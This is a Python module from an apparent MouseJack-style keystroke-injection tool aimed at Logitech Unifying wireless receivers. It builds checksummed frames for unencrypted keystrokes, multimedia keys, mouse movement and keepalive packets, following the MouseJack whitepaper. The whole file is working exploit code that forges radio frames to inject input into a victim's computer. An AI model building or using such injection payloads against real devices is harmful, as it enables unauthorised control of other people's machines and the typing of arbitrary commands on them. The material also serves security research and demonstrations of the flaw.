"""
This file contains the functionalities specific to the Logitech Unifying protocol,
including payload formats, keepalive payloads and implementation of build_frame().
"""

from ..hid_scan_codes import * # no problem doing a relative import since this file should not be executed
from ..general_utils import *

# constants
KEEPALIVE_TIMEOUT = 0x4B0 # 1200ms
TIMEOUT_BYTES = KEEPALIVE_TIMEOUT.to_bytes(2, byteorder='big') # splitting the timeout into two bytes in big endian (b'\x04\0xB0')
DELAY_BETWEEN_TRANSMISSIONS = 12 / 1000 # 12ms

# We need to remember whether the last injected key was a multimedia key or a standard one,
# because we could have a key release packet in the middle, and in order to have an effect it should match the type of the key typed just before it.
is_last_key_multimedia = False

def with_checksum(payload):
    """
    This function calculates the checksum of a given Unifying payload and appends the result at the end of the payload.
    The algorithm is based on slide 56 of the KeyKeriki project: http://www.remote-exploit.org/content/keykeriki_v2_cansec_v1.1.pdf
    """
    cksum = 0xFF
    for n in range(len(payload)):
        cksum = (cksum - payload[n]) & 0xFF # using bitwise AND with 0xFF in order to make sure the checksum doesn't go negative (and thus exceeds 1 byte)
    cksum = (cksum + 1) & 0xFF # if cksum is 0xFF at this point, then adding 1 will cause it to exceed 1 byte, so doing the same thing
    payload.append(cksum)
    return payload

def unencrypted_keystroke_payload(scan_code, modifier=KEY_MOD_NONE):
    """
    This function returns an unencrypted keystroke payload based on the given scan code and modifier.
    Refer to Table 8 in the MouseJack whitepaper: Logitech Unencrypted Keystroke Payload.
    """
    return with_checksum([0x00, 0xC1, modifier, scan_code, 0x00, 0x00, 0x00, 0x00, 0x00]) # applying the checksum

def multimedia_key_payload(scan_code):
    """
    This function returns a multimedia key payload based on the given scan code.
    Refer to Table 9 in the MouseJack whitepaper: Logitech Multimedia Key Payload.
    """
    return with_checksum([0x00, 0xC3] + list(scan_code.to_bytes(2, byteorder='little')) + [0x00, 0x00, 0x00, 0x00, 0x00]) # for codes more than one byte long, turns out it needs to be little endian

# Keepalive-related payload formats
SET_KEEPALIVE_TIMEOUT_PAYLOAD = with_checksum([0x00, 0x4F, 0x00] + list(TIMEOUT_BYTES) + [0x00, 0x00, 0x00, 0x00]) # refer to Figure 5 in the MouseJack whitepaper: Logitech Unifying Set Keepalive Timeout Payload
KEEPALIVE_PAYLOAD = with_checksum([0x00, 0x40] + list(TIMEOUT_BYTES)) # refer to Figure 6 in the MouseJack whitepaper: Logitech Unifying Keepalive Payload

def build_frame(scan_code, modifier=KEY_MOD_NONE):
    """
    This function receives the scan code and modifier of a keystroke, and returns the proper frame/payload (list of bytes).
    """
    global is_last_key_multimedia # stating that this variable is the same one declared in the global scope, not local

    # special case - if the desired keystroke is a key release of a previous multimedia key, then transmit a multimedia key payload
    if scan_code == KEY_RELEASE and modifier == KEY_MOD_NONE and is_last_key_multimedia:
        return multimedia_key_payload(scan_code)
    
    # return the proper payload
    if scan_code in multimedia_keys:
        is_last_key_multimedia = True # update the flag
        return multimedia_key_payload(scan_code)
    is_last_key_multimedia = False # update the flag
    return unencrypted_keystroke_payload(scan_code, modifier)

################################################## Copied from general utils ########################################################
def format_bytes(data):
    # e.g. the payload: [0x00, 0xC1, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3B] is formatted as: 00:C1:00:04:00:00:00:00:00:3B
    return ':'.join('{:02X}'.format(b) for b in data)

def payload_str_to_bytes(payload):
    # e.g. the payload string: 00:C1:00:04:00:00:00:00:00:3B is converted to: [0x00, 0xC1, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3B]
    return list(bytes.fromhex(payload.replace(':', '')))
#####################################################################################################################################

def mouse_move(x, y):
    combined_str = x + y
    movement = int(combined_str, 16)
    return with_checksum(payload_str_to_bytes("00:C2:00:00:" + format_bytes(movement.to_bytes(3, byteorder='little')) + ":00:00")) # must be little endian!